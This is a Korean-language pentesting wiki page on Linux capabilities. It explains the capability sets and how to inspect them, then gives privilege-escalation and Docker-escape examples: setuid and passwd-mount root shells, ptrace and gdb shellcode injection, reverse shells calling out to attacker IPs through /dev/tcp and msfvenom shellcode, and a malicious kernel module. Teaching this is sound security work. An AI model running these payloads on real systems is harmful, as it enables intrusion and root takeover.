# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities는 **root 권한을 더 작고 독립적인 단위로 분할**하여 프로세스가 권한의 일부만 가질 수 있도록 합니다. 이를 통해 불필요하게 전체 root 권한을 부여하지 않으므로 위험을 최소화합니다.

### 문제:

- 일반 사용자는 제한된 권한만 가지므로, root access가 필요한 네트워크 소켓 열기와 같은 작업에 영향을 받습니다.

### Capability Set:

1. **Inherited (CapInh)**:

- **목적**: 부모 프로세스에서 전달되는 capabilities를 결정합니다.
- **기능**: 새 프로세스가 생성되면 이 set에 있는 부모 프로세스의 capabilities를 상속합니다. 프로세스 생성 과정에서 특정 권한을 유지하는 데 유용합니다.
- **제한 사항**: 프로세스는 부모 프로세스가 보유하지 않은 capabilities를 획득할 수 없습니다.

2. **Effective (CapEff)**:

- **목적**: 프로세스가 특정 시점에 실제로 사용하는 capabilities를 나타냅니다.
- **기능**: 다양한 작업에 대한 permission을 부여할 때 kernel이 확인하는 capabilities set입니다. 파일의 경우 파일의 permitted capabilities를 effective로 간주할지 나타내는 flag가 될 수 있습니다.
- **중요성**: Effective set은 즉각적인 privilege check에 필수적이며, 프로세스가 사용할 수 있는 활성 capabilities set으로 작동합니다.

3. **Permitted (CapPrm)**:

- **목적**: 프로세스가 보유할 수 있는 capabilities의 최대 set을 정의합니다.
- **기능**: 프로세스는 permitted set의 capability를 effective set으로 올려 해당 capability를 사용할 수 있습니다. 또한 permitted set에서 capabilities를 제거할 수도 있습니다.
- **범위**: 프로세스가 가질 수 있는 capabilities의 상한으로 작동하여, 프로세스가 사전 정의된 privilege 범위를 초과하지 않도록 합니다.

4. **Bounding (CapBnd)**:

- **목적**: 프로세스가 lifecycle 동안 획득할 수 있는 capabilities에 상한을 설정합니다.
- **기능**: 프로세스가 inheritable 또는 permitted set에 특정 capability를 가지고 있더라도, 해당 capability가 bounding set에도 포함되지 않으면 획득할 수 없습니다.
- **사용 사례**: 이 set은 프로세스의 privilege escalation 가능성을 제한하는 데 특히 유용하며, 추가적인 security layer를 제공합니다.

5. **Ambient (CapAmb)**:
- **목적**: 일반적으로 프로세스의 capabilities를 모두 reset하는 `execve` system call 이후에도 특정 capabilities를 유지할 수 있도록 합니다.
- **기능**: 연결된 file capabilities가 없는 non-SUID 프로그램이 특정 privileges를 유지할 수 있도록 합니다.
- **제한 사항**: 이 set의 capabilities는 inheritable 및 permitted sets의 제약을 받으므로, 프로세스에 허용된 privileges를 초과하지 않습니다.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
추가 정보는 다음을 확인하세요:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes 및 Binaries Capabilities

### Processes Capabilities

특정 process의 capabilities를 확인하려면 /proc directory의 **status** file을 사용하세요. 더 많은 세부 정보를 제공하므로 Linux capabilities와 관련된 정보만 표시하도록 제한하겠습니다.\
실행 중인 모든 process의 capability 정보는 thread별로 유지되며, file system의 binaries에서는 extended attributes에 저장된다는 점에 유의하세요.

capabilities는 /usr/include/linux/capability.h에 정의되어 있습니다.

현재 process의 capabilities는 `cat /proc/self/status` 또는 `capsh --print`를 실행하여 확인할 수 있으며, 다른 사용자의 capabilities는 `/proc/<pid>/status`에서 확인할 수 있습니다.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
이 명령은 대부분의 시스템에서 5줄을 반환합니다.

- CapInh = 상속된 capabilities
- CapPrm = 허용된 capabilities
- CapEff = 유효한 capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
이 16진수 숫자들은 의미가 없습니다. `capsh` utility를 사용하면 이를 capabilities 이름으로 디코딩할 수 있습니다.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
이제 `ping`에서 사용되는 **capabilities**를 확인해 봅시다:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
이 방법도 작동하지만, 더 쉽고 간단한 방법이 있습니다. 실행 중인 프로세스의 capabilities를 확인하려면 **getpcaps** tool 뒤에 프로세스 ID(PID)를 입력하면 됩니다. 프로세스 ID 목록을 제공할 수도 있습니다.
```bash
getpcaps 1234
```
바이너리에 네트워크 sniffing에 필요한 충분한 capability(`cap_net_admin` 및 `cap_net_raw`)를 부여한 후 `tcpdump`의 capabilities를 확인해 보겠습니다(_tcpdump는 프로세스 9562에서 실행 중입니다_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
보시다시피, 주어진 capabilities는 binary의 capabilities를 가져오는 두 가지 방법의 결과와 일치합니다.\
_getpcaps_ tool은 특정 thread에 사용 가능한 capabilities를 조회하기 위해 **capget()** system call을 사용합니다. 이 system call은 추가 정보를 얻기 위해 PID만 제공하면 됩니다.

### Binaries Capabilities

Binaries는 실행 중에 사용할 수 있는 capabilities를 가질 수 있습니다. 예를 들어, `ping` binary가 `cap_net_raw` capability를 가지고 있는 경우를 매우 흔하게 확인할 수 있습니다:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
다음을 사용하여 capabilities가 설정된 **바이너리**를 **검색**할 수 있습니다:
```bash
getcap -r / 2>/dev/null
```
### capsh를 사용한 capabilities 제거

\_ping*에서 CAP*NET_RAW capabilities를 제거하면 ping utility가 더 이상 작동하지 않아야 합니다.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ 자체의 출력 외에도 _tcpdump_ 명령 자체에서도 오류가 발생해야 합니다.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

이 오류는 ping 명령이 ICMP socket을 열 수 없음을 명확히 보여줍니다. 이제 이것이 예상대로 작동한다는 것을 확실히 알 수 있습니다.

### Capabilities 제거

바이너리의 capabilities는 다음 명령으로 제거할 수 있습니다.
```bash
setcap -r </path/to/binary>
```
## 사용자 Capabilities

분명히 **사용자에게도 capabilities를 할당할 수 있습니다**. 이는 해당 사용자가 실행하는 모든 프로세스가 사용자의 capabilities를 사용할 수 있다는 의미일 가능성이 높습니다.\
[this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [this](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) 및 [this](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)에 따르면 사용자에게 특정 capabilities를 부여하려면 몇 가지 파일을 구성해야 하지만, 각 사용자에게 capabilities를 할당하는 파일은 `/etc/security/capability.conf`입니다.\
파일 예시:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 환경 Capabilities

다음 프로그램을 컴파일하면 **Capabilities를 제공하는 환경 내부에서 bash shell을 실행**할 수 있습니다.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**컴파일된 ambient binary에 의해 실행된 bash 내부에서는** **새로운 capabilities**를 확인할 수 있습니다(일반 사용자는 "current" 섹션에 어떠한 capability도 갖지 않습니다).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> **permitted** set과 **inheritable** set 모두에 존재하는 capabilities만 추가할 수 있습니다.

### Capability-aware/Capability-dumb binaries

**Capability-aware binaries**는 환경에서 제공된 새로운 capabilities를 사용하지 않지만, **Capability-dumb binaries**는 이를 거부하지 않으므로 사용합니다. 이로 인해 binaries에 capabilities를 부여하는 특수한 환경에서 **Capability-dumb binaries**가 취약해집니다.

## Service Capabilities

기본적으로 **root로 실행되는 service에는 모든 capabilities가 할당**되며, 일부 경우에는 위험할 수 있습니다.\
따라서 **service configuration** 파일을 사용하면 필요한 **capabilities**와 불필요한 권한으로 service가 실행되는 것을 방지하기 위해 service를 실행해야 하는 **user**를 **지정**할 수 있습니다:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Containers의 Capabilities

기본적으로 Docker는 Containers에 몇 가지 Capabilities를 할당합니다. 다음을 실행하면 어떤 Capabilities인지 매우 쉽게 확인할 수 있습니다:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities는 **privileged operations를 수행한 후 자신의 process를 제한하려는 경우**(예: chroot를 설정하고 socket에 bind한 후) 유용합니다. 그러나 악성 commands 또는 arguments를 전달하면 이를 exploit할 수 있으며, 전달된 commands 또는 arguments는 이후 root 권한으로 실행됩니다.

`setcap`을 사용하여 programs에 capabilities를 강제로 적용할 수 있으며, `getcap`을 사용하여 이를 조회할 수 있습니다:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep`는 capability를 Effective 및 Permitted로 추가한다는 의미입니다 (`-`는 제거한다는 의미).

시스템 또는 폴더에서 capabilities가 설정된 프로그램을 식별하려면:
```bash
getcap -r / 2>/dev/null
```
### Exploitation 예시

다음 예시에서는 바이너리 `/usr/bin/python2.6`이 privesc에 취약한 것으로 확인됩니다:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**모든 사용자가 패킷을 sniff할 수 있도록 `tcpdump`에 필요한 Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "empty" capabilities의 특수한 경우

[문서에서](https://man7.org/linux/man-pages/man7/capabilities.7.html): 프로그램 파일에 빈 capability 집합을 할당할 수 있다는 점에 유의해야 합니다. 따라서 프로그램을 실행하는 프로세스의 effective 및 saved set-user-ID를 0으로 변경하지만, 해당 프로세스에 어떠한 capability도 부여하지 않는 set-user-ID-root 프로그램을 만들 수 있습니다. 또는 간단히 말해, 다음 조건을 만족하는 binary가 있다면:

1. root가 소유자가 아님
2. `SUID`/`SGID` bit가 설정되어 있지 않음
3. 빈 capabilities 집합을 가짐 (예: `getcap myelf`가 `myelf =ep`를 반환)

그러면 **해당 binary는 root로 실행됩니다**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 매우 강력한 Linux capability로, device를 mount하거나 kernel feature를 조작하는 등의 광범위한 **administrative privileges**를 제공하기 때문에 root에 가까운 수준의 권한으로 간주되는 경우가 많습니다. 전체 system을 시뮬레이션하는 container에는 필수적이지만, **`CAP_SYS_ADMIN`은 특히 containerized environment에서 심각한 security challenge를 야기합니다**. privilege escalation 및 system compromise로 이어질 가능성이 있기 때문입니다. 따라서 이 capability의 사용에는 엄격한 security assessment와 신중한 관리가 필요하며, **principle of least privilege**를 준수하고 attack surface를 최소화하기 위해 application-specific container에서는 이 capability를 제거하는 것이 강력히 권장됩니다.

**binary를 사용한 예시**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python을 사용하면 수정된 _passwd_ 파일을 실제 _passwd_ 파일 위에 mount할 수 있습니다:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
그리고 마지막으로 수정된 `passwd` 파일을 `/etc/passwd`에 **mount**합니다:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
그리고 "password" 비밀번호를 사용하여 root로 **`su`**할 수 있습니다.

**환경을 사용한 예시 (Docker breakout)**

다음을 사용하여 Docker 컨테이너 내부에서 활성화된 capabilities를 확인할 수 있습니다:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 SYS_ADMIN capability가 활성화되어 있는 것을 확인할 수 있습니다.

- **Mount**

이를 통해 docker container가 **host disk를 mount하고 자유롭게 접근**할 수 있습니다:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **전체 액세스**

이전 방법에서는 Docker host 디스크에 액세스하는 데 성공했습니다.\
host가 **ssh** server를 실행 중인 것을 확인한 경우, **Docker host** 디스크 내부에 user를 생성하고 SSH를 통해 액세스할 수 있습니다:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**이는 host 내부에서 실행 중인 일부 process에 shellcode를 주입하여 container에서 탈출할 수 있다는 의미입니다.** host 내부에서 실행 중인 process에 접근하려면 container를 최소한 **`--pid=host`** 옵션과 함께 실행해야 합니다.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**는 `ptrace(2)`가 제공하는 debugging 및 system call tracing 기능과 `process_vm_readv(2)`, `process_vm_writev(2)`와 같은 cross-memory attach 호출을 사용할 수 있는 권한을 부여합니다. 진단 및 monitoring 용도로는 강력하지만, `ptrace(2)`에 대한 seccomp filter와 같은 제한 조치 없이 `CAP_SYS_PTRACE`가 활성화되면 system security를 크게 약화시킬 수 있습니다. 특히 [이와 같은 proofs of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53)에서 확인할 수 있듯이, seccomp가 적용한 제한을 우회하는 데 악용될 수 있습니다.

**binary를 사용한 예시 (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**바이너리 예제 (gdb)**

`ptrace` capability를 사용하는 `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
msfvenom으로 gdb를 통해 메모리에 주입할 shellcode 생성
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
gdb로 root 프로세스를 디버깅하고 이전에 생성된 gdb 라인을 복사하여 붙여넣습니다:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**환경을 사용한 예시 (Docker breakout) - 또 다른 gdb Abuse**

**GDB**가 설치되어 있거나(예를 들어 `apk add gdb` 또는 `apt install gdb`로 설치할 수 있음) 호스트에서 프로세스를 **debug**하여 `system` function을 호출하게 만들 수 있습니다. (이 technique에는 `SYS_ADMIN` capability도 필요합니다)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
명령어 실행 결과는 확인할 수 없지만 해당 process가 명령어를 실행하므로 rev shell을 획득할 수 있습니다.

> [!WARNING]
> "No symbol "system" in current context." 오류가 발생하면 gdb를 통해 프로그램에 shellcode를 로드하는 이전 예제를 확인하세요.

**Docker breakout - Shellcode Injection 예시**

다음을 사용하여 docker container 내부에서 활성화된 capabilities를 확인할 수 있습니다:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**호스트**에서 실행 중인 **프로세스** 나열 `ps -eaf`

1. **아키텍처** 확인 `uname -m`
2. 해당 아키텍처에 맞는 **shellcode** 찾기 ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. 프로세스 메모리에 **shellcode**를 **inject**할 **프로그램** 찾기 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. 프로그램 내부의 **shellcode**를 **수정**하고 **compile**하기 `gcc inject.c -o inject`
5. 이를 **inject**하고 **shell** 획득하기: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 프로세스가 **kernel module을 load 및 unload할 수 있도록(`init_module(2)`, `finit_module(2)` 및 `delete_module(2)` system call)** 하여 kernel의 핵심 작업에 직접 접근할 수 있도록 합니다. 이 capability는 kernel을 수정하여 Linux Security Modules와 container isolation을 포함한 모든 Linux security mechanism을 우회할 수 있으므로, privilege escalation 및 전체 system compromise를 가능하게 하는 치명적인 security risk를 초래합니다.
**이는 호스트 시스템의 kernel에 kernel module을 **insert/remove**할 수 있다는 의미입니다.**

**바이너리를 사용한 예시**

다음 예시에서 바이너리 **`python`**에는 이 capability가 있습니다.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
기본적으로 **`modprobe`** 명령은 **`/lib/modules/$(uname -r)`** 디렉터리에서 dependency list 및 map 파일을 확인합니다.\
이를 악용하기 위해 가짜 **lib/modules** 폴더를 생성합니다:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
그런 다음 아래에서 찾을 수 있는 2개의 예제인 **kernel module을 compile하고** 이 폴더에 copy하세요:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
마지막으로, 이 kernel module을 로드하는 데 필요한 Python 코드를 실행합니다:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**binary를 사용한 예제 2**

다음 예제에서 **`kmod`** binary에는 이 capability가 있습니다.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
